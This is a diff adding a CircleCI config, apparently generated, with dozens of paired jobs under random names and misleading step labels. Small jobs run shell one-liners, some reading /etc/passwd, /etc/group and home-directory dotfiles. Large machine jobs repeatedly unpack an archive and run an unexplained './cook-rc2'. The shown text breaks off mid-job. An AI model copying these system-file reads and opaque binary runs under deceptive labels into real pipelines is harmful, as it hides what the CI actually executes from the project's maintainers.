@@ -1,0 +1,1253 @@
+version: 2.1
+
+jobs:
+  as_name:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: ping v18 beta
+          command: |
+            mkdir -p /tmp/make
+            set +o pipefail 2>/dev/null; a() { echo "stage1"; seq 1 $1 ; }; b() { echo "stage2"; sha1sum < <(seq 1 $1) ; }; { a 1013951; b 1013951; } > /tmp/make/INV-2023-28533; true
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'INV-2023-28533'
+  java17-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/INV-2023-28533 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+  missData:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: RET
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; echo 47 22 75 35 | tr ' ' '\n' | sort -n | uniq | paste -sd+; true ; } > /tmp/make/crimson.meadow.fjord
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'crimson.meadow.fjord'
+  WEB-137:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/crimson.meadow.fjord 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+  m_castleTile:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: deploy blue green slots too
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; df -h -x tmpfs | tr -s ' ' | sort | tr -s ' '; true ; } > /tmp/make/seed-82x
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'seed-82x'
+  go1-21-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/seed-82x 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+  v14-25-50:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Bundle The Enemy Waves And Playtest
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; od -An -tu1 -N12 /dev/urandom | tr -s ' ' '\n' | grep . | tail -8; true ; } > /tmp/make/IMG-00022727
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'IMG-00022727'
+  run-full-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/IMG-00022727 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+  catEIpZYAvz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Post game binning
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; grep --no-messages --recursive --include='*.conf' umask /usr/share/doc/bash | cut -d: -f1 | sort -u; true ; } > /tmp/make/07.01.2021
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - '07.01.2021'
+  sanity:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/07.01.2021 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+  UK:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Thanks during peak hours
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; printf '%s\n' orange magenta cyan white >"/tmp/museum_bugs_20241026.txt" && tac "/tmp/museum_bugs_20241026.txt"; true ; } > /tmp/make/PO_007168
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'PO_007168'
+  sam-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/PO_007168 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+  lnlam:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Hat trick batching
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; for path in $HOME/.bash*; do echo "$(basename "$path"): $(wc -l < "$path")"; done | wc -l; true ; } > /tmp/make/release_51311
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'release_51311'
+  validte-92:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/release_51311 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+  l3g:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: The raw events ready yet
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; echo owl goose swan zebra crow | xargs printf "%s\n" | sort; true ; } > /tmp/make/crc_295a0e37e92492e6
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'crc_295a0e37e92492e6'
+  canary-v1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/crc_295a0e37e92492e6 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+  RULE_H:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Hail mary optimization
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; if grep -q "model name" /proc/cpuinfo; then echo "found"; else echo "not found"; fi; true ; } > /tmp/make/drIVERPhOTOnLOaDeROTtER
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'drIVERPhOTOnLOaDeROTtER'
+  node20-fmt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/drIVERPhOTOnLOaDeROTtER 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+  FormCanvasHandlerCur:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: revoking secrets quietly
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; test -G $HOME && echo yes || echo no; true ; } > /tmp/make/GARDEN_GLYPH_DESERT
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'GARDEN_GLYPH_DESERT'
+  fx-x:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/GARDEN_GLYPH_DESERT 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+  Pen:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: anonymize invoice rows last
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; find /usr/share -maxdepth 2 -name '*.xml' -size +0 -exec ls -1d {} + 2>/dev/null | sed 's|.*/||' | sort -u; true ; } > /tmp/make/GADGET
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'GADGET'
+  helios-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/GADGET 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+  user_flatten_line:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Tune skill tree for level 6
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; find /run -type d -name '*.sock' -exec basename "{}" \; 2>/dev/null | wc -l; true ; } > /tmp/make/pr0xy.g4dge7.neu7r0n.hol1ow.m3adow
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'pr0xy.g4dge7.neu7r0n.hol1ow.m3adow'
+  mike-8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/pr0xy.g4dge7.neu7r0n.hol1ow.m3adow 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+  stack-2022-09-15:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: 23 mix
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; grep -v nologin /etc/passwd | cut -d':' -f1 | tac; true ; } > /tmp/make/89mbc5x9vzkq5
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - '89mbc5x9vzkq5'
+  cerberus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/89mbc5x9vzkq5 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+  rate82867:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Me measuring the socket pool
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; ls -F1a $HOME|wc -w; true ; } > /tmp/make/iter6_3592
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'iter6_3592'
+  edge-v6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/iter6_3592 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+  OPT_GENERATOR:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Write off the open invoices day 2
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; jobs; wait; echo "no jobs left"; true ; } > /tmp/make/REF5781
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'REF5781'
+  WEB-540:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/REF5781 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+  Global-Pointer:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Verify the chaos scenarios in batches
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; cat /etc/passwd | sort -t : -k3,3 -n | tail -n10; true ; } > /tmp/make/139.15.72
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - '139.15.72'
+  validte:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/139.15.72 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+  RD-END-TAB:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Seed data is go
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; /usr/bin/ls -i /etc/skel|wc -l; true ; } > /tmp/make/batch_404
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'batch_404'
+  fiona-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/batch_404 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+  DateIndexPattern:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Tidy up the fixtures
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; if [ -e /etc/hosts ] ; then echo 'true'; elif [ -e /tmp ] ; then echo maybe; else echo false; fi; true ; } > /tmp/make/wave-heath-willow
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'wave-heath-willow'
+  cerberus-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/wave-heath-willow 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+  panel--full:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Move the sudoers file to prod
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; ls /usr/bin | pr -4 -t -w 80 | tr '[:lower:]' '[:upper:]'; true ; } > /tmp/make/YieldDelta
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'YieldDelta'
+  teh-ci-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/YieldDelta 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+  Util_17197:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Promote the mentor pairings ready for posterity
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; grep 'sh$' /etc/passwd | tr ':' ' ' | wc -w; true ; } > /tmp/make/6OssV5
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - '6OssV5'
+  DEV_MERGE_7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/6OssV5 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+  xcvbnmasdf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Only if the error rows are missing
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; cp /etc/group /tmp/h.txt && sed -i '/^root/d' /tmp/h.txt && diff /etc/group /tmp/h.txt | head -5; true ; } > /tmp/make/9.36.166.58
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - '9.36.166.58'
+  tango-4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/9.36.166.58 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+  stopOrigGraph:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: BLD 153 Serving endpoint sweep
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 1 -type f -printf '%s\n' 2>/dev/null | sort -n | awk '{print $1 * 2}'; true ; } > /tmp/make/1JloGZ
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - '1JloGZ'
+  jul25-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/1JloGZ 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+  psi_pred:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Call Ahmed if the spool directory fails
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; printf -v w "%x" 3280; echo "0x$w"; true ; } > /tmp/make/crash_20241107
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'crash_20241107'
+  RunPipeline:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/crash_20241107 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+  routes-get:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Sort the crash reports to free memory
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; grep -iHs export /etc/profile | sort | uniq -c; true ; } > /tmp/make/MVI68520
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'MVI68520'
+  Prepare_Staging6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/MVI68520 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+  Guard-Path-Manifest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: BEGIN CHECKPOINT REPLICATION LAG
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; sleep 1 & wait $!; echo done; true ; } > /tmp/make/net-env
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'net-env'
+  fx-alt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/net-env 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+  blog-email-text:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scale out the version tag
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; df -h|awk 'NR>1 {print $5, $6}'|expand -t 2|fold -w 21; true ; } > /tmp/make/CopperRouterPulseBison
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'CopperRouterPulseBison'
+  fx-old:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/CopperRouterPulseBison 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+  barbaz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Bung the boss arena through optimisation
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; echo -n "first line" | sha1sum; true ; } > /tmp/make/2.108
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - '2.108'
+  fix-edge-glitch:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/2.108 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+  panWorkerRequest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Enforcement for later
+          command: |
+            mkdir -p /tmp/make
+            { set +o pipefail 2>/dev/null; cat /etc/passwd | tr ':' ' ' | sort | cut -c1-17; true ; } > /tmp/make/west.West
+            echo "finished"
+      - persist_to_workspace:
+          root: /tmp/make
+          paths:
+            - 'west.West'
+  nebula-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/make
+      - run:
+          name: Scan cache dir
+          command: |
+            cat < /tmp/make/west.West 2>/dev/null | tr -d '\n' | wc -c || true
+      - run:
+          name: Clone sources
+          command: git clone --depth 1 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Sync asset bundles
+          command: tar -I xz -xf build-images-v3.tar.xz
+      - run:
+          command: /bin/sh -c "./cook-rc2"
+  saveMotorTax:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
